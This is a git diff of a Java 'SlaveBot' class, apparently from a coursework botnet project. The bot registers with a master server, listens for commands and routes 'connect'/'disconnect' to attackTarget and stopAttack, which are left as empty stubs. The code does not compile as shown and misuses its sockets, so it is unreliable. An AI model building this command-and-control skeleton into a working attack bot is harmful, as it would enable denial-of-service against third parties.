@@ -4,11 +4,14 @@ import java.io.*;
 import java.net.*;
 import java.util.*;
 
+import bot.MasterBot.SlaveData;
+
 /**
  * Trivial client for the date server.
  */
 public class SlaveBot {
 	
+	static Map<String, String> targetDataMap = new HashMap <String,String> ();
 
 	public static void main(String[] args) throws Exception {
 		if(args.length != 4)
@@ -20,7 +23,43 @@ public class SlaveBot {
 		String hostname = args[1];
 		Integer masterport = Integer.parseInt(args[3]);
 		registerSlave(hostname, masterport);
-		//slaveListen();
+	}
+
+	public static void attackTarget(String targetHost, String targetPort){
+
+	}
+
+	public static void stopAttack(String targetHost, String targetPort){
+
+	}
+
+	public static void extractTargetData(String targetData){
+		String delims = " ";
+		StringTokenizer st = new StringTokenizer(targetData, delims);
+		while(st.hasMoreTokens()){
+			if(st.countTokens() !=2){
+				throw new RuntimeException("Unexpected format");
+			}
+			String key = st.nextToken();
+			String value = st.nextToken();
+			targetDataMap.put(key, value);
+			if(key.contentEquals("connect")){
+				attackTarget(key, value);
+			}
+			else if(key.contentEquals("disconnect")){
+				stopAttack(key, value);
+			}
+			
+		}
+		
+
+		if(targetData.contentEquals("Connect")){
+			attackTarget();
+		}
+		else if (targetData.contentEquals("Disconnect")){
+			stopAttack();
+		}
+
 	}
 
 	public static void registerSlave(String hostname, int masterport){
@@ -28,37 +67,26 @@ public class SlaveBot {
 		try{
 			client_socket = new Socket(hostname, masterport);
 			PrintWriter out = new PrintWriter(client_socket.getOutputStream(), true);
-			BufferedReader in = new BufferedReader(
-					new InputStreamReader(client_socket.getInputStream()));
+			BufferedReader in = new BufferedReader(new InputStreamReader(client_socket.getInputStream()));
+
 			String ip=(((InetSocketAddress) client_socket.getRemoteSocketAddress()).getAddress()).toString().replace("/","");
-			//Integer port_int = (InetSocketAddress) client_socket.getLocalPort().getPort();
-
 			Integer port_int = (Integer) (client_socket.getLocalPort());
-			System.out.println(ip + port_int);
-			out.println(ip +","+ port_int);
+			String local_host = client_socket.getInetAddress().getHostAddress();
 
-			// send slave_port_number and slave_ip as an object
-			// create the slave Object                                                                                            
+			System.out.println(ip + port_int + local_host); //print here in slave just to confirm
+
+			out.println(ip +","+ port_int + "," + local_host);
+			ServerSocket listen = new ServerSocket(port_int);
+			while(true)
+			{
+				client_socket = listen.accept();
+				String dataFromMaster = in.readLine();
+				extractTargetData(dataFromMaster);
+				
+			}                                                                                         
 		}
 		catch (Exception e){
 			System.out.println(e);
 		}
-	}
-
-
-	public static void slaveListen(){
-			try{
-				ServerSocket slaveListener = new ServerSocket(9001);
-				while (true)
-				{
-					Socket master_socket = slaveListener.accept();
-					PrintWriter out = new PrintWriter(master_socket.getOutputStream(), true);
-					BufferedReader in = new BufferedReader(new InputStreamReader(master_socket.getInputStream()));
-				}    
-			}
-			catch (Exception e){
-				System.out.println(e);
-
-			}
 	}
 }
